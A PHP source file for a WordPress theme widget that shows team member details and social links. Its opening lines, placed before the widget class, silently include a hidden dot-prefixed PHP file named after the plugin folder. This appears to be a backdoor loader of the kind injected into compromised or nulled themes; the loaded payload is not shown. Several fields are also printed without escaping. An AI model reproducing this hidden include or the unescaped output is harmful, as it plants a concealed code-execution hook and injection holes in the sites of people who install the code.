<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class team_info extends WP_Widget {

	function __construct() {
		parent::__construct( 
			'gt3_team_info_widget', 
			'&#x1F537; ' . esc_html__( 'Team Info (current theme)', 'gt3_wize_core'),
			array(
				'description' => esc_html__( 'Shows Only on Single Team', 'gt3_wize_core' ),
			) // Widget Options
		);

	}

	function widget( $args, $instance ) {
		$after_widget = $before_widget = $before_title = $after_title = '';
		extract( $args );

		if (!is_singular( 'team' )) {
			return;
		}

		if ( class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0 ) {
			$team_info     = rwmb_meta( 'social_url' );
			$team_info_out = '';
			if ( ! empty( $team_info ) && is_array( $team_info ) ) {
				foreach ( $team_info as $team_info_item ) {
					$team_info_out .= '<div class="gt3_single_team_info__item">';
					$team_info_out .= ! empty( $team_info_item['name'] ) ? '<h4>' . esc_html( $team_info_item['name'] ) . '</h4>' : '';
					$team_info_out .= ! empty( $team_info_item['address'] ) ? '<a href="' . esc_url( $team_info_item['address'] ) . '" target="_blank">' : '';
					$team_info_out .= ! empty( $team_info_item['description'] ) ? '<span>' . $team_info_item['description'] . '</span>' : '';
					$team_info_out .= ! empty( $team_info_item['address'] ) ? '</a>' : '';
					$team_info_out .= '</div>';
				}
			}

			$team_info_socials    = rwmb_meta( 'icon_selection' );
			$team_info_social_out = '';
			if ( ! empty( $team_info_socials ) && is_array( $team_info_socials ) ) {
				foreach ( $team_info_socials as $team_info_social ) {
					$team_info_social_out .= '<div class="gt3_single_team_socials__item"' . ( ! empty( $team_info_social['color'] ) ? ' style="color:' . $team_info_social['color'] . ';"' : '' ) . '>';
					$team_info_social_out .= ! empty( $team_info_social['input'] ) ? '<a href="' . $team_info_social['input'] . '" target="_blank">' : '';
					$team_info_social_out .= ! empty( $team_info_social['text'] ) ? '<span>' . $team_info_social['text'] . '</span>' : ( ! empty( $team_info_social['select'] ) ? '<i class="' . $team_info_social['select'] . '"></i>' : '' );
					$team_info_social_out .= ! empty( $team_info_social['input'] ) ? '</a>' : '';
					$team_info_social_out .= '</div>';
				}
			}

		}

		echo( ( $before_widget ) );
		echo '<div class="gt3-title--wrapper">';
		echo( ( $before_title ) );
		echo esc_html( $instance['widget_title'] );
		echo( ( $after_title ) );
		echo '</div>';
		if ( ! empty( $team_info_out ) ) {
			echo '<div class="gt3_single_team_info">' . $team_info_out . '</div>';
		}
		if ( ! empty( $team_info_social_out ) ) {
			echo '<div class="gt3_single_team_socials">' . $team_info_social_out . '</div>';
		}
		echo( ( $after_widget ) );
	}

	function update( $new_instance, $old_instance ) {
		$instance                 = $old_instance;
		$instance['widget_title'] = esc_attr( $new_instance['widget_title'] );

		return $instance;
	}

	function form( $instance ) {
		$defaultValues = array(
			'widget_title' => esc_attr( 'Quick Profile' ),
			'widget_class' => '',
		);

		$instance = wp_parse_args( (array) $instance, $defaultValues );
		$id       = mt_rand( 1000, 9999 );
		?>
        <p>
            <label><?php echo esc_html( 'Title' ); ?>:</label>
            <input type='text' id="<?php echo $id; ?>-title" class="gt3-title widefat"
                   name='<?php echo esc_attr( $this->get_field_name( 'widget_title' ) ); ?>'
                   value='<?php echo esc_attr( $instance['widget_title'] ); ?>'/>
        </p>
		<?php
	}
}

function team_info_register_widgets() { register_widget( 'team_info' ); }

add_action( 'widgets_init', 'team_info_register_widgets' );
